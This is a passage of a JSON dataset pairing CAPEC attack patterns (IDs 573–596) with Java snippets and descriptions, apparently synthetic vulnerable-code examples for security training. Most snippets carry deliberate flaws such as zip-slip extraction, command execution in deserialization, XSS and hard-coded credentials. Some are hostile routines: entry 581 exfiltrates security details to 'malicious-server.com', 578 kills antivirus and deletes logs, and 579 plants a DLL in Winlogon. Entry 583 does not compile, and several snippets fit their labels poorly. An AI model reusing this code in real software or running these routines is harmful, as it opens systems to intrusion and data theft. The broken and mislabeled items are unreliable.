        "code_snippet": "public class FileUploadHandler {\n    private static final String UPLOAD_DIR = \"/uploads/\";\n\n    public void handleFileUpload(String fileName, byte[] content) {\n        File uploadDir = new File(UPLOAD_DIR);\n        if (!uploadDir.exists()) {\n            uploadDir.mkdir();\n        }\n\n        try {\n            FileOutputStream fos = new FileOutputStream(UPLOAD_DIR + fileName, true);\n            BufferedOutputStream bos = new BufferedOutputStream(fos);\n            bos.write(content);\n            bos.close();\n            fos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processUploadedFile(String fileName) {\n        if (fileName.toLowerCase().endsWith(\".zip\")) {\n            try {\n                ZipInputStream zis = new ZipInputStream(new FileInputStream(UPLOAD_DIR + fileName));\n                ZipEntry entry;\n                while ((entry = zis.getNextEntry()) != null) {\n                    byte[] buffer = new byte[1024];\n                    FileOutputStream fos = new FileOutputStream(UPLOAD_DIR + entry.getName());\n                    int len;\n                    while ((len = zis.read(buffer)) > 0) {\n                        fos.write(buffer, 0, len);\n                    }\n                    fos.close();\n                }\n                zis.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates several security issues: it allows unrestricted file uploads without type checking, relies on file extensions for processing, handles compressed files without size limits, and appends to files without proper validation. The code doesn't limit file descriptor allocation, lacks proper path traversal checks, and doesn't implement any quota system for uploads. It's vulnerable to ZIP bombs due to unrestricted decompression and allows arbitrary file overwriting through append mode."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "public class ProcessLister {\n    public static void listProcesses() {\n        try {\n            Process p = Runtime.getRuntime().exec(\"ps -ef\");\n            String processInfo = new String(p.getInputStream().readAllBytes());\n            \n            // Store process information in publicly accessible log\n            FileWriter writer = new FileWriter(\"process_log.txt\");\n            writer.write(\"System processes:\\n\" + processInfo);\n            writer.close();\n            \n            // Display process information without authorization check\n            System.out.println(processInfo);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code retrieves system process information and stores it in a publicly accessible log file without any access control or authorization checks. It also displays sensitive process information to standard output, potentially exposing system details to unauthorized users. The code uses Runtime.exec() to execute system commands directly and stores sensitive information in plaintext."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "public class SystemServiceInfo {\n    public static void listServices() {\n        try {\n            String command = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n                ? \"cmd.exe /c net start\"\n                : \"ps -ef\";\n                \n            ProcessBuilder pb = new ProcessBuilder(command.split(\" \"));\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            \n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream())\n            );\n            \n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            \n            process.waitFor();\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        listServices();\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation that exposes sensitive system service information. It executes system commands to list running services without proper access control or filtering, potentially revealing sensitive system information to unauthorized users. The code directly outputs service information to standard output, making it visible to any user who can run the application, and uses potentially dangerous system commands without proper validation or sanitization."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "public class SystemInfoRetriever {\n    public static void main(String[] args) {\n        try {\n            String username = \"admin\";\n            String password = \"secret123\";\n            \n            Process process = Runtime.getRuntime().exec(\"net user\");\n            Process dsquery = Runtime.getRuntime().exec(\"dsquery user -limit 0\", \n                new String[]{\"USERNAME=\" + username, \"PASSWORD=\" + password});\n            \n            String domainInfo = new String(process.getInputStream().readAllBytes());\n            String userInfo = new String(dsquery.getInputStream().readAllBytes());\n            \n            // Store sensitive info in publicly accessible directory\n            FileWriter writer = new FileWriter(\"/public/domain_users.txt\");\n            writer.write(\"Domain Users:\\n\" + domainInfo + \"\\nDetailed User Info:\\n\" + userInfo);\n            writer.close();\n            \n            // Display all gathered information on screen\n            System.out.println(\"System User Information:\" + domainInfo);\n            System.out.println(\"Domain Query Results:\" + userInfo);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable system information retrieval and storage by executing system commands with hardcoded credentials, storing sensitive domain user information in a publicly accessible location, and displaying sensitive system information on screen. The code exposes system user details through command execution, stores access control information in an unsafe location, and reveals sensitive command-line arguments containing credentials."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "public class UserGroupManager {\n    public static void listAllGroups() {\n        try {\n            Process process = Runtime.getRuntime().exec(\"net localgroup\");\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            \n            File groupsFile = new File(\"/tmp/groups.txt\");\n            FileWriter writer = new FileWriter(groupsFile);\n            \n            String line;\n            while ((line = reader.readLine()) != null) {\n                writer.write(line + \"\\n\");\n                System.out.println(\"Group found: \" + line);\n            }\n            \n            writer.close();\n            groupsFile.setReadable(true, false);\n            \n            ProcessBuilder pb = new ProcessBuilder(\"chmod\", \"777\", \"/tmp/groups.txt\");\n            pb.start();\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code executes a system command to list local groups, stores the sensitive information in a world-readable file, and exposes group information through system output. It demonstrates multiple security issues including exposure of sensitive information, unsafe file permissions, and visible command-line information."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "public class UserInfoRetriever {\n    public static void getUserLoginInfo(String username) {\n        try {\n            String userDir = \"/home/\" + username;\n            File ntUserDat = new File(userDir + \"/ntuser.dat\");\n            \n            // Create a temporary file with world-readable permissions\n            File tempLog = new File(\"/tmp/user_activity.log\");\n            tempLog.createNewFile();\n            tempLog.setReadable(true, false);\n            \n            // Write sensitive information to temp file\n            FileWriter writer = new FileWriter(tempLog);\n            writer.write(\"Last login for \" + username + \": \" + \n                        new Date(ntUserDat.lastModified()) + \"\\n\");\n            writer.write(\"Home directory: \" + userDir + \"\\n\");\n            writer.write(\"System user info: \" + System.getProperty(\"user.name\") + \"\\n\");\n            writer.close();\n            \n            // Execute system command with sensitive info in arguments\n            Runtime.getRuntime().exec(\"ls -l \" + userDir + \"/ntuser.dat\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code retrieves and exposes sensitive user information through multiple channels: it creates a world-readable temporary file containing user login times and system information, executes system commands with sensitive information in arguments, and doesn't properly validate access permissions. The code demonstrates issues with information exposure, insecure temporary file creation, and improper system information handling."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "public class SecurityManager {\n    private static final String ADMIN_PASSWORD = \"s3cret123\";\n    \n    public static void disableSecurityTools() {\n        if (checkPassword(ADMIN_PASSWORD)) {\n            try {\n                // Kill antivirus process\n                Runtime.getRuntime().exec(\"taskkill /F /IM antivirus.exe\");\n                \n                // Delete security logs\n                File logFile = new File(\"C:/security/logs/events.log\");\n                logFile.delete();\n                \n                // Disable security service from registry\n                Runtime.getRuntime().exec(\"reg delete HKLM\\\\SOFTWARE\\\\SecurityService /f\");\n                \n                // Optimize critical security check away\n                boolean securityCheck = true;\n                if (securityCheck) {\n                    // This check might be optimized away by compiler\n                    validateSecurityStatus();\n                }\n            } catch (IOException e) {\n                // Silently ignore exceptions\n            }\n        }\n    }\n    \n    private static boolean checkPassword(String password) {\n        return password.equals(ADMIN_PASSWORD);\n    }\n    \n    private static void validateSecurityStatus() {\n        // Critical security check that might be optimized away\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: hard-coded admin credentials, unrestricted access to critical security functions, ability to disable security tools and delete logs, compiler-optimizable security checks, and lack of proper access controls. The code allows complete disabling of security mechanisms with minimal validation, and its security-critical checks could be optimized away by the compiler."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "public class WindowsStartupLoader {\n    private static final String REGISTRY_KEY = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\";\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"secretpass123\";\n\n    public void installMaliciousDLL() {\n        try {\n            String dllPath = System.getProperty(\"user.home\") + \"\\\\malicious.dll\";\n            \n            // Connect to registry using hardcoded credentials\n            WinRegistry.connect(USERNAME, PASSWORD);\n            \n            // Set DLL to load at startup through Winlogon\n            WinRegistry.writeStringValue(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                REGISTRY_KEY,\n                \"Userinit\",\n                \"C:\\\\Windows\\\\System32\\\\userinit.exe,\" + dllPath\n            );\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String getCurrentUser() {\n        // Unsafe in multithreaded environment\n        return System.getProperty(\"user.name\");\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation that modifies Windows registry to load a malicious DLL through Winlogon at startup. It uses hardcoded credentials, operates in an unsafe multithreaded environment, and modifies system configuration settings that could be exploited. The code allows external control of system settings and uses an uncontrolled search path for the DLL location."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "public class UserAuthenticator {\n    private static final String SECRET_KEY = \"sk_live_12345\";\n    \n    public boolean authenticateUser(String username, String password) {\n        long startTime = System.nanoTime();\n        boolean userExists = checkUserInDB(username);\n        \n        if (!userExists) {\n            return false;\n        }\n        \n        boolean isValid = verifyCredentials(username, password);\n        long endTime = System.nanoTime();\n        \n        if (endTime - startTime > 500000000) { // 500ms threshold\n            System.out.println(\"Debug: Authentication took \" + (endTime - startTime) + \" ns\");\n            System.out.println(\"Debug: Database connection string: jdbc:mysql://localhost:3306/userdb\");\n            System.out.println(\"Debug: Using encryption key: \" + SECRET_KEY);\n        }\n        \n        return isValid;\n    }\n    \n    private boolean checkUserInDB(String username) {\n        // Simulated database check with timing difference\n        try {\n            if (username.length() > 0) {\n                Thread.sleep(100); // Delay for existing users\n            }\n            return true;\n        } catch (InterruptedException e) {\n            return false;\n        }\n    }\n    \n    private boolean verifyCredentials(String username, String password) {\n        return true; // Simplified for example\n    }\n}",
        "description": "This vulnerable code demonstrates multiple information disclosure vulnerabilities through timing attacks, debug information leakage, and observable behavior differences. The code reveals sensitive system information in debug messages, exhibits timing discrepancies based on whether a user exists, and exposes internal state through different response patterns. It also contains hardcoded sensitive information like database credentials and encryption keys."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "public class SecurityAuditor {\n    public static void collectSecurityInfo() {\n        String osName = System.getProperty(\"os.name\");\n        String userHome = System.getProperty(\"user.home\");\n        \n        try {\n            Process p = Runtime.getRuntime().exec(\"tasklist\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (line.toLowerCase().contains(\"antivirus\") || \n                    line.toLowerCase().contains(\"firewall\") || \n                    line.toLowerCase().contains(\"defender\")) {\n                    sendDataToRemoteServer(\"http://malicious-server.com/collect\", line);\n                }\n            }\n            \n            File securityConfig = new File(userHome + \"/.security/config.xml\");\n            if (securityConfig.exists()) {\n                FileInputStream fis = new FileInputStream(securityConfig);\n                byte[] data = new byte[(int) securityConfig.length()];\n                fis.read(data);\n                sendDataToRemoteServer(\"http://malicious-server.com/collect\", new String(data));\n                fis.close();\n            }\n        } catch (Exception e) {\n            // Silently ignore exceptions to avoid detection\n        }\n    }\n    \n    private static void sendDataToRemoteServer(String url, String data) {\n        // Implementation to send data to remote server\n    }\n}",
        "description": "This code demonstrates a malicious implementation that covertly collects information about installed security software and security configurations. It searches for security-related processes and attempts to access security configuration files, then sends this sensitive information to a remote server without user consent. The code is disguised as a security auditing tool but actually functions as spyware/trojan horse, embodying CWE-497, CWE-506, CWE-512, and CWE-507."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "public class NetworkRouter {\n    private Map<String, String> routingTable = new HashMap<>();\n    private boolean isEnabled = true;\n    \n    public void addRoute(String source, String destination) {\n        routingTable.put(source, destination);\n    }\n    \n    public boolean routePacket(String source, String destination, Packet packet) {\n        // Vulnerable: No validation of route authenticity or packet integrity\n        if (!isEnabled) {\n            return false;\n        }\n        \n        String route = routingTable.get(source);\n        if (route != null && route.equals(destination)) {\n            // No verification if destination is reachable or valid\n            forwardPacket(packet, destination);\n            return true;\n        }\n        return false;\n    }\n    \n    public void disableRouting() {\n        // Vulnerable: No authentication required to disable routing\n        isEnabled = false;\n        routingTable.clear();\n    }\n    \n    private void forwardPacket(Packet packet, String destination) {\n        // Vulnerable: No checks for race conditions or alternate channels\n        try {\n            Socket socket = new Socket(destination, 80);\n            socket.getOutputStream().write(packet.getData());\n            socket.close();\n        } catch (Exception e) {\n            // Silent failure, no error handling\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable network routing implementation that allows an attacker to disable network routes between targets. The code lacks proper authentication for route management, doesn't validate message integrity, and has no protection against unauthorized modifications of the routing table. It also fails to properly verify endpoint authenticity and contains race conditions in the communication channel."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "public class PowerManagementSystem {\n    private boolean powerState = true;\n    private boolean alertsEnabled = true;\n    private int redundancyLevel = 3;\n    \n    public void setPowerState(boolean state) {\n        // No authentication or validation\n        powerState = state;\n        if (!state) {\n            // Directly modifies hardware state without checks\n            disableHardwareComponents();\n        }\n    }\n    \n    private void disableHardwareComponents() {\n        // Critical hardware configuration state not preserved\n        systemRegistry.write(0x1234, 0x00);\n        redundancyLevel = 0;\n        alertsEnabled = false;\n    }\n    \n    private void systemRegistry.write(int address, int value) {\n        // Direct hardware access without restrictions\n        // Potentially dangerous low-level hardware manipulation\n    }\n    \n    public boolean getSystemStatus() {\n        // No integrity verification\n        return powerState;\n    }\n}",
        "description": "This vulnerable code demonstrates unrestricted access to power management functionality, allowing unauthorized manipulation of hardware power states and configuration. It lacks authentication, proper state preservation during power transitions, and protection of alert mechanisms. The code allows direct modification of hardware registers and can disable system redundancy without proper verification or safeguards."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "public class BGPRouter {\n    private Map<String, List<RouteAdvertisement>> routeTable = new HashMap<>();\n    private boolean isAuthenticated = false;\n\n    public void processRouteAdvertisement(String asNumber, RouteAdvertisement advert) {\n        // Vulnerable: No validation of source AS number\n        // Vulnerable: No message integrity checking\n        routeTable.put(asNumber, Collections.singletonList(advert));\n    }\n\n    public void negotiateRoutingProtocol(String peerAS) {\n        String[] supportedProtocols = {\"BGP4\", \"BGP3\", \"BGP2\"};\n        // Vulnerable: Accepts any protocol version without security validation\n        for (String protocol : supportedProtocols) {\n            if (peerAS.contains(protocol)) {\n                establishConnection(protocol);\n                break;\n            }\n        }\n    }\n\n    private void establishConnection(String protocol) {\n        // Vulnerable: No rate limiting on route advertisements\n        Socket socket = new Socket();\n        try {\n            socket.connect(new InetSocketAddress(\"peer-as.example.com\", 179));\n            // Vulnerable: No verification of peer identity\n            DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n            out.writeUTF(\"CONNECT \" + protocol);\n        } catch (IOException e) {\n            // Silent failure allows route suppression to go unnoticed\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable BGP router implementation that allows route advertisement suppression and manipulation. It exhibits multiple vulnerabilities: lack of source validation, no message integrity checks, protocol downgrade susceptibility, insufficient traffic volume control, and improper peer authentication. An attacker could exploit these weaknesses to suppress legitimate route advertisements or force less optimal routes."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "public class DomainValidator {\n    public boolean validateDomain(String ipAddress) {\n        try {\n            // Vulnerable: Relies solely on reverse DNS for validation\n            InetAddress addr = InetAddress.getByName(ipAddress);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: Open redirect without validation\n            String redirectUrl = \"http://\" + hostname + \"/auth\";\n            response.sendRedirect(redirectUrl);\n            \n            // Vulnerable: Cross-domain policy\n            String policy = \"<cross-domain-policy>\\n\";\n            policy += \"<allow-access-from domain=\\\"*\\\" />\"; // Allows all domains\n            policy += \"</cross-domain-policy>\";\n            \n            // Vulnerable: Unescaped output\n            String userInput = request.getParameter(\"domain\");\n            response.getWriter().println(\"Domain: \" + userInput);\n            \n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to domain validation and access control. It relies on reverse DNS lookup for security decisions, implements a permissive cross-domain policy, includes an open redirect vulnerability, and contains cross-site scripting vulnerability through unescaped output. These vulnerabilities could allow an attacker to manipulate domain validation or redirect users to malicious sites."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "public class UserService {\n    public User loadUserProfile(byte[] serializedData) {\n        try {\n            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serializedData));\n            return (User) ois.readObject();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}\n\npublic class User implements Serializable {\n    private String username;\n    private String password;\n    private boolean isAdmin;\n    \n    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {\n        ois.defaultReadObject();\n        // Vulnerable: No validation of deserialized data\n        Runtime.getRuntime().exec((String) ois.readObject());\n    }\n}",
        "description": "This code demonstrates an unsafe deserialization vulnerability where user-supplied serialized data is processed without validation. The User class contains sensitive data (username and password) and implements a custom readObject method that executes arbitrary commands during deserialization. An attacker could craft a malicious serialized object that, when deserialized, would execute arbitrary system commands."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "public class VulnerableLoginPage {\n    @WebServlet(\"/login\")\n    public class LoginServlet extends HttpServlet {\n        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n            String advertiserId = request.getParameter(\"ad\");\n            String content = request.getParameter(\"content\");\n            \n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            \n            out.println(\"<html><body>\");\n            out.println(\"<h2>Login Page</h2>\");\n            // Vulnerable: directly embedding user input into iframe src\n            out.println(\"<iframe src='\" + advertiserId + \"' style='display:none'></iframe>\");\n            // Vulnerable: unescaped content insertion\n            out.println(\"<div>\" + content + \"</div>\");\n            out.println(\"<form action='login' method='post'>\");\n            out.println(\"Username: <input type='text' name='username'><br>\");\n            out.println(\"Password: <input type='password' name='password'><br>\");\n            out.println(\"<input type='submit' value='Login'>\");\n            out.println(\"</form></body></html>\");\n        }\n    }\n}",
        "description": "This vulnerable code allows for clickjacking and XSS attacks by accepting unvalidated user input and embedding it directly into the page's HTML. It creates a hidden iframe that could load malicious content, and directly outputs user-controlled content without proper sanitization. The code lacks proper frame restrictions, input validation, and CSRF protections."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "public class SearchResults {\n    public String displayResults(String searchTerm) {\n        String html = \"<div class='results'>\";\n        html += \"<h2>Search results for: \" + searchTerm + \"</h2>\";\n        html += \"<script>\\n\";\n        html += \"  function showDetails() {\\n\";\n        html += \"    var term = location.hash.substring(1);\\n\";\n        html += \"    document.getElementById('details').innerHTML = decodeURIComponent(term);\\n\";\n        html += \"  }\\n\";\n        html += \"</script>\";\n        html += \"<div id='details'></div>\";\n        html += \"<button onclick='showDetails()'>Show Details</button>\";\n        html += \"</div>\";\n        return html;\n    }\n}",
        "description": "This code is vulnerable to DOM-based XSS as it directly injects user input from the URL fragment (location.hash) into the DOM without any sanitization. An attacker can craft a malicious URL with JavaScript in the fragment identifier that will be executed when the 'Show Details' button is clicked. The code also demonstrates improper input validation (CWE-20) and improper neutralization of script content (CWE-79)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "public class DNSClient {\n    private static final String DNS_SERVER = \"0.0.0.0\";\n    \n    public String resolveDomain(String domainName, String clientIP) {\n        try {\n            // Authenticate based on IP address only\n            if (isValidIP(clientIP)) {\n                // Perform reverse DNS lookup without verification\n                InetAddress addr = InetAddress.getByName(clientIP);\n                String hostname = addr.getHostName();\n                \n                // Create unsecured DNS socket\n                DatagramSocket socket = new DatagramSocket();\n                socket.bind(new InetSocketAddress(DNS_SERVER, 53));\n                \n                // Send DNS query without encryption or validation\n                byte[] query = createDNSQuery(domainName);\n                DatagramPacket packet = new DatagramPacket(query, query.length,\n                    InetAddress.getByName(DNS_SERVER), 53);\n                socket.send(packet);\n                \n                // Wait for response without timeout\n                byte[] response = new byte[512];\n                DatagramPacket responsePacket = new DatagramPacket(response, response.length);\n                socket.receive(responsePacket);\n                \n                return parseDNSResponse(responsePacket.getData());\n            }\n            return null;\n        } catch (Exception e) {\n            return null;\n        }\n    }\n    \n    private boolean isValidIP(String ip) {\n        // Simply check if IP exists, no additional validation\n        return ip != null && !ip.isEmpty();\n    }\n}",
        "description": "This vulnerable code implements a DNS client that demonstrates multiple security issues: binding to 0.0.0.0, relying solely on IP address for authentication, performing unsafe reverse DNS lookups, and using an unsecured communication channel. The code lacks proper endpoint verification, timeout mechanisms, and proper channel security, making it susceptible to DNS request dropping attacks and man-in-the-middle attacks."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "public class VulnerableServer {\n    private static final String ANY_IP = \"0.0.0.0\";\n    \n    public void startServer() {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080, 50, InetAddress.getByName(ANY_IP));\n            \n            while(true) {\n                Socket clientSocket = serverSocket.accept();\n                String clientIP = clientSocket.getInetAddress().getHostAddress();\n                \n                // Vulnerable authentication based solely on IP\n                if(isWhitelistedIP(clientIP)) {\n                    // Grant access without additional authentication\n                    handlePrivilegedOperation(clientSocket);\n                }\n            }\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private boolean isWhitelistedIP(String clientIP) {\n        // Naive IP whitelist check\n        return clientIP.startsWith(\"192.168.\");\n    }\n    \n    private void handlePrivilegedOperation(Socket clientSocket) {\n        // Perform sensitive operations without proper endpoint verification\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: binding to 0.0.0.0 (CWE-1327), relying solely on IP address for authentication (CWE-291), lack of proper endpoint verification (CWE-923), and inadequate channel security (CWE-300). The server accepts connections from any IP and uses a simple IP-based whitelist for authentication, making it susceptible to IP spoofing and unauthorized access."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "public class UserProfileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"name\");\n        PrintWriter out = response.getWriter();\n        response.setContentType(\"text/html\");\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Welcome, \" + userInput + \"!</h2>\");\n        out.println(\"<img src='\" + request.getParameter(\"avatar\") + \"'>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This servlet demonstrates reflected XSS vulnerability by directly embedding user input into the HTML response without sanitization. It accepts two parameters: 'name' and 'avatar', both of which are reflected back in the response without proper encoding. The name parameter is inserted directly into the page content, while the avatar parameter is inserted into an img tag's src attribute, allowing for potential script injection through both vectors."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "public class BlogPostController {\n    private BlogPostRepository repository;\n\n    @PostMapping(\"/posts\")\n    public String savePost(@RequestParam String title, @RequestParam String content) {\n        // Store user input directly without sanitization\n        BlogPost post = new BlogPost();\n        post.setTitle(title);\n        post.setContent(content);\n        repository.save(post);\n        return \"redirect:/posts\";\n    }\n\n    @GetMapping(\"/posts\")\n    public String displayPosts(Model model) {\n        List<BlogPost> posts = repository.findAll();\n        // Directly inject stored content into HTML without escaping\n        StringBuilder html = new StringBuilder();\n        for(BlogPost post : posts) {\n            html.append(\"<div class='post'>\")\n                .append(\"<h2>\").append(post.getTitle()).append(\"</h2>\")\n                .append(\"<div>\").append(post.getContent()).append(\"</div>\")\n                .append(\"</div>\");\n        }\n        model.addAttribute(\"posts\", html.toString());\n        return \"posts\";\n    }\n}",
        "description": "This code demonstrates a stored XSS vulnerability in a blog application where user input is stored in a database without sanitization and later displayed directly in HTML output. The application fails to escape special characters or validate user input, allowing attackers to inject malicious scripts that are stored and executed when other users view the posts."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "public class SessionManager {\n    private static Map<String, Session> sessions = new HashMap<>();\n\n    public static String createSession(String username) {\n        String sessionId = String.valueOf(Math.random() * 1000); // Short, predictable session ID\n        Session session = new Session(username);\n        sessions.put(sessionId, session);\n        return sessionId;\n    }\n\n    public static boolean validateSession(String sessionId) {\n        return sessions.containsKey(sessionId); // No session expiration check\n    }\n\n    public static void login(HttpServletRequest request, String username) {\n        String sessionId = request.getParameter(\"sessionId\");\n        if(sessionId != null) {\n            // Accepts existing session ID from request without regenerating\n            sessions.put(sessionId, new Session(username));\n        }\n    }\n\n    private static class Session {\n        private String username;\n        public Session(String username) {\n            this.username = username;\n        }\n    }\n}",
        "description": "The code demonstrates multiple session management vulnerabilities: using short and predictable session IDs, lack of session expiration, allowing session fixation by accepting user-provided session IDs, and no session invalidation upon login. The authentication relies solely on session presence without proper validation."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "public class NetworkCommunicator {\n    private Socket socket;\n    private String serverAddress;\n\n    public NetworkCommunicator(String address) {\n        this.serverAddress = address;\n    }\n\n    public void sendSensitiveData(String username, String password) {\n        try {\n            socket = new Socket(serverAddress, 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            \n            // Vulnerable: sending sensitive data in cleartext\n            String credentials = username + \":\" + password;\n            out.println(credentials);\n\n            // Vulnerable: no message integrity checks\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String response = in.readLine();\n            \n            // Vulnerable: no verification of message source\n            processResponse(response);\n            \n            // Vulnerable: no control over message volume\n            while (true) {\n                String data = in.readLine();\n                if (data == null) break;\n                broadcastMessage(data);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processResponse(String response) {\n        // Vulnerable: potential resource injection\n        File file = new File(response);\n        try {\n            FileInputStream fis = new FileInputStream(file);\n            // Process file...\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void broadcastMessage(String message) {\n        // Vulnerable: no rate limiting or volume control\n        try {\n            byte[] data = message.getBytes();\n            DatagramSocket udpSocket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(serverAddress);\n            DatagramPacket packet = new DatagramPacket(data, data.length, address, 8081);\n            udpSocket.send(packet);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable network communication that allows traffic injection through multiple vectors. It transmits sensitive data in cleartext, lacks message integrity verification, performs no source validation, has no control over network message volume, and allows potential resource injection through unvalidated input processing."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "public class VulnerableSocketServer {\n    private ServerSocket serverSocket;\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(8080, 50);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(() -> handleClient(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleClient(Socket clientSocket) {\n        try {\n            // No verification of source IP or connection validity\n            DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n            DataOutputStream out = new DataOutputStream(clientSocket.getOutputStream());\n\n            // No message integrity checks\n            String message = in.readUTF();\n            \n            // Vulnerable to replay attacks - no session tokens or timestamps\n            processMessage(message);\n            \n            // No proper connection termination handling\n            out.writeUTF(\"Processed: \" + message);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processMessage(String message) {\n        // Process message without verifying its authenticity or integrity\n    }\n}",
        "description": "This vulnerable code demonstrates a socket server implementation that is susceptible to TCP Reset attacks. The server lacks proper source verification, message integrity checks, and connection state management. It binds to a fixed port without checking for existing bindings, doesn't implement any protection against replay attacks, and doesn't validate the authenticity of incoming connections. The absence of proper connection termination handling makes it vulnerable to RST packet injection."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "public class VulnerableWebServer {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        String url = request.getParameter(\"url\");\n        try {\n            URL targetUrl = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // Vulnerable: No origin verification\n            String forwardedFor = request.getHeader(\"X-Forwarded-For\");\n            conn.setRequestProperty(\"X-Forwarded-For\", forwardedFor);\n\n            // Vulnerable: Direct usage of user input in headers\n            String customHeader = request.getHeader(\"Custom-Header\");\n            conn.setRequestProperty(\"Custom-Header\", customHeader);\n\n            // Vulnerable: No TCP connection state validation\n            InputStream inputStream = conn.getInputStream();\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                response.getOutputStream().write(buffer, 0, bytesRead);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an HTTP proxy implementation that is susceptible to TCP RST attacks, SSRF, and request smuggling. It lacks proper verification of the request origin, doesn't validate TCP connection states, and directly forwards user-supplied headers without sanitization. The code also doesn't implement any replay protection mechanisms, making it vulnerable to capture-replay attacks."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
